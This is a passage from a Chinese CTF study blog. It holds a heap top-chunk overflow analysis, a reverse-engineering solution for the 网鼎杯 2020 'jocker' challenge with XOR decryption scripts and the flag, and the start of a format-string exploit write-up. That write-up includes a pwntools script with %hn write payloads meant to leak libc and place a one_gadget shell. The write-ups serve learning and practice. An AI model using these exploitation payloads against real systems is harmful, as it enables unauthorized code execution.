class="comment"># 获取交互控制权</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>再动调中更容易理解</p>
<p>add(0x30, ‘chunk0’)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)   //v4</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd2b0</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)   //add(0x30, &#x27;chunk0&#x27;)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd2f0</span><br><span class="line">Size: 0x20d10 (with flag bits: 0x20d11)   </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x91fd290</span><br><span class="line">0x91fd290:	0x0000000000000000	0x0000000000000021  </span><br><span class="line">0x91fd2a0:	0x0000000000400857	0x0000000000400876</span><br><span class="line">0x91fd2b0:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x91fd2c0:	0x000a306b6e75686	0x0000000000000000  //chunk0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x0400857</span><br><span class="line">00:0000│  0x400857 (hello_message) ◂— push rbp   //hello_message起始地址</span><br><span class="line">01:0008│  0x40085f (hello_message+8) ◂— or byte ptr [rax], al</span><br><span class="line">02:0010│  0x400867 (hello_message+16) ◂— lea rdi, [rip + 0x823]</span><br><span class="line">03:0018│  0x40086f (hello_message+24) ◂— pop rbp</span><br><span class="line">04:0020│  0x400877 (goodbye_message+1) ◂— mov rbp, rsp</span><br><span class="line">05:0028│  0x40087f (goodbye_message+9) ◂— add byte ptr [rax], al</span><br><span class="line">06:0030│  0x400887 (goodbye_message+17) ◂— pop rbp</span><br><span class="line">07:0038│  0x40088f (menu+6) ◂— cmp eax, 0x82d</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x400876</span><br><span class="line">00:0000│  0x400876 (goodbye_message) ◂— push rbp  //goodbye_message起始地址</span><br><span class="line">01:0008│  0x40087e (goodbye_message+8) ◂— or byte ptr [rax], al</span><br><span class="line">02:0010│  0x400886 (goodbye_message+16) ◂— nop </span><br><span class="line">03:0018│  0x40088e (menu+5) ◂— lea edi, [rip + 0x82d]</span><br><span class="line">04:0020│  0x400896 (menu+13) ◂— 0x83e3d8d48fffffe</span><br><span class="line">05:0028│  0x40089e (menu+21) ◂— add byte ptr [rax], al</span><br><span class="line">06:0030│  0x4008a6 (menu+29) ◂— lea edi, [rip + 0x815]</span><br><span class="line">07:0038│  0x4008ae (menu+37) ◂— 0x8433d8d48fffffe</span><br></pre></td></tr></table></figure>

<p>edit(0, len(payload), payload)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd2b0</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: 0x91fd2f0</span><br><span class="line">Size: 0xfffffffffffffff8 (with flag bits: 0xffffffffffffffff)   //top_chunk的size改变了</span><br></pre></td></tr></table></figure>

<p>由于我的libc版本较高，检查到堆溢出可能就崩掉了就无法继续了。远程可以打通</p>
<p>这里我就接着解释一些数据怎么来的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x30:这个没什么要求换成其他数据也可以</span><br><span class="line">0x38: 0x91fd2f0 - 0x91fd2b0 = 0x40,0x40 - 0x16(chunk0的header) + 0x08(top的pre_size) = 0x30</span><br><span class="line">-(0x60 + 0x8 + 0xf):0x91fd2f0 - 0x91fd290 = 0x60，top和v4的header的距离 ，0x8 + 0xf和强制对齐有关</span><br><span class="line">0x10:v4[0]和v4[1]正好0x10,换成比0x10大的数据都可以</span><br></pre></td></tr></table></figure>

<p>强制对齐操作的公式是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nb = ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK</span><br></pre></td></tr></table></figure>

<ul>
<li><p>**<code>req</code>**：用户调用 <code>malloc(req)</code> 时申请的数据大小（即用户需要的内存字节数）。</p>
</li>
<li><p>**<code>SIZE_SZ</code>**：在 64 位系统中为 <code>0x8</code>（表示 <code>sizeof(size_t)</code>）。它常被理解为 chunk 头部（header）大小的一部分，但实际上，header 总大小为 <code>2 * SIZE_SZ = 0x10</code> 字节（包括 <code>prev_size</code> 和 <code>size</code> 字段）。</p>
</li>
<li><p>**<code>MALLOC_ALIGN_MASK</code>**：在 64 位系统中为 <code>0xf</code>（十六进制），对应内存对齐掩码。内存对齐要求通常是 16 字节（即 <code>MALLOC_ALIGN = 16</code>），所以掩码为 <code>16 - 1 = 15</code>（即 <code>0xf</code>）。</p>
</li>
<li><p>**<code>nb</code>**：输出的值，表示实际分配的 chunk 总大小（包括 header 和用户数据区域）。</p>
</li>
<li><p><code>offset = -0x77</code> 对应 <code>malloc</code> 参数为 <code>0xffffffffffffff89</code></p>
</li>
<li><p>对齐后实际分配大小：<code>(0xffffffffffffff89 + 8 + 15) &amp; ~15 = 0xffffffffffffffa0</code></p>
</li>
<li><p>使top chunk回退 <code>0x60</code> 字节</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/" class="post-title-link" itemprop="url">[网鼎杯 2020 青龙组]jocker</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-15 10:41:18" itemprop="dateCreated datePublished" datetime="2025-07-15T10:41:18+08:00">2025-07-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:14:34" itemprop="dateModified" datetime="2025-09-23T21:14:34+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>开始网鼎杯的jocker学习</p>
<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/1.png" alt="1"></p>
<p>修复sp</p>
<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/2.png" alt="2"></p>
<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/3.png" alt="3"></p>
<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/4.png" alt="4"></p>
<p>可是encrypt函数还是进不去</p>
<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/5.png" alt="5"></p>
<p>这是个smc动调解密函数，进入函数后从text:00401500的定义头道endp进行u(undefine)再在定义头p重定义函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">encrypt</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1[<span class="number">19</span>]; <span class="comment">// [esp+1Ch] [ebp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+68h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  qmemcpy(v1, &amp;unk_403040, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">18</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span>)(a1[i] ^ Buffer[i]) != v1[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;wrong ~&quot;</span>);</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;come here&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到加密函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预定义的 unk_403040 数组</span></span><br><span class="line">unk_403040 = [</span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x56</span>,</span><br><span class="line">    <span class="number">0x3E</span>, <span class="number">0x06</span>,</span><br><span class="line">    <span class="number">0x0C</span>, <span class="number">0x3C</span>, <span class="number">0x1F</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">0x6B</span>, <span class="number">0x57</span>, <span class="number">0x59</span>,</span><br><span class="line">    <span class="number">0x0D</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Buffer 字符串</span></span><br><span class="line">buffer_str = <span class="string">&#x27;hahahaha_do_you_find_me?&#x27;</span></span><br><span class="line"><span class="comment"># 解密过程</span></span><br><span class="line">decrypted = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(unk_403040)):</span><br><span class="line">    <span class="comment"># 异或操作</span></span><br><span class="line">    decrypted_char = <span class="built_in">chr</span>(unk_403040[i] ^ <span class="built_in">ord</span>(buffer_str[i]))</span><br><span class="line">    decrypted += decrypted_char</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted string:&quot;</span>, decrypted)</span><br><span class="line"><span class="comment">#Decrypted string: flag&#123;d07abccf8a410c</span></span><br></pre></td></tr></table></figure>

<p>得到了一半flag，我们刚刚分析的时候有个finally的函数进去看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">finally</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">__time32_t</span> *Time; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">9</span>]; <span class="comment">// [esp+13h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;%tp&amp;:&quot;</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  v5 = rand() % <span class="number">100</span>;</span><br><span class="line">  v4[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;v4[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (v4[(<span class="type">unsigned</span> __int8)v4[<span class="number">5</span>]] != a1[(<span class="type">unsigned</span> __int8)v4[<span class="number">5</span>]]) == v5 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)Time);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;I hide the last part, you will not succeed!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据最后一个字符 ‘}’ 猜测</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">encrypted = <span class="string">&quot;%tp&amp;:&quot;</span></span><br><span class="line">known_plaintext = <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">known_ciphertext = encrypted[-<span class="number">1</span>]  <span class="comment"># &#x27;:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算异或密钥</span></span><br><span class="line">key = <span class="built_in">ord</span>(known_ciphertext) ^ <span class="built_in">ord</span>(known_plaintext)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;找到密钥: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密整个字符串</span></span><br><span class="line">decrypted = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ key) <span class="keyword">for</span> c <span class="keyword">in</span> encrypted)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解密后的字符串: <span class="subst">&#123;decrypted&#125;</span>&quot;</span>)    </span><br><span class="line"><span class="comment">#找到密钥: 71</span></span><br><span class="line"><span class="comment">#解密后的字符串: b37a&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d07abccf8a410cb37a&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/" class="post-title-link" itemprop="url">格式化字符串专题加强</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-08 15:13:34" itemprop="dateCreated datePublished" datetime="2025-07-08T15:13:34+08:00">2025-07-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:29:06" itemprop="dateModified" datetime="2025-09-23T21:29:06+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/" itemprop="url" rel="index"><span itemprop="name">stack</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" itemprop="url" rel="index"><span itemprop="name">格式化字符串</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>进行格式化字符串专题的加强，先写一个题目，再重温一下知识点进行总结一下。</p>
<h3 id="TGCTF-fmt"><a href="#TGCTF-fmt" class="headerlink" title="TGCTF fmt"></a>TGCTF fmt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome TGCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your gift %p\n&quot;</span>, buf);   <span class="comment">//泄露出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30u</span>LL);    <span class="comment">//没有栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( magic == <span class="number">1131796</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(buf);   <span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    magic = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只有一个格式化字符串漏洞，也只有一个读入。先去查看一下保护</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(myenv) linkpwn@linkpwn-VMware-Virtual-Platform:~$ checksec pwn</span><br><span class="line">[*] &#x27;/home/linkpwn/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>没有开启pie，canary开启了，但是我们没用到栈溢出，所以我们不用管canary</p>
<p>因此这个题目的攻击思路就是，先利用格式化字符串泄露libc的基地址，然后再利用one_gadget.。</p>
<p>首先我们利用格式化字符串泄露libc的地址，同时也要利用格式化字符串写入one_gadget。</p>
<p>要利用两次格式化字符串的话，我们就不能让函数执行到    magic &#x3D; 0;，所以我们必须把printf_ret的地址覆盖为read的地址，方便下次</p>
<p>的读入。</p>
<p>泄露出libc_start_main+xxx的地址可以计算出libc的基地址。</p>
<p>再用one_get工具查出execve(&#x2F;bin&#x2F;sh)的偏移，在用格式化字符串漏洞将返回地址写成execve(&#x2F;bin&#x2F;sh)的地址就可以getshell了</p>
<p>现在开始正式开始攻击</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 配置与初始化 ================</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)              <span class="comment"># 本地调试</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;ip&#x27;, port)  # 远程连接</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 泄露栈地址 ================</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">f&quot;Stack address: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 第一次格式化字符串攻击：泄露 libc 地址 ================</span></span><br><span class="line">payload = <span class="string">b&quot;%4669c%11$hn&quot;</span>           <span class="comment"># 控制写入低 2 字节</span></span><br><span class="line">payload += <span class="string">b&quot;%19$p&quot;</span>                 <span class="comment"># 泄露 __libc_start_main 地址</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr - <span class="number">8</span>)      <span class="comment"># 写入到 stack_addr - 8 的位置</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收泄露的 libc 地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leaked_libc = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = leaked_libc - <span class="number">122</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line">info(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span 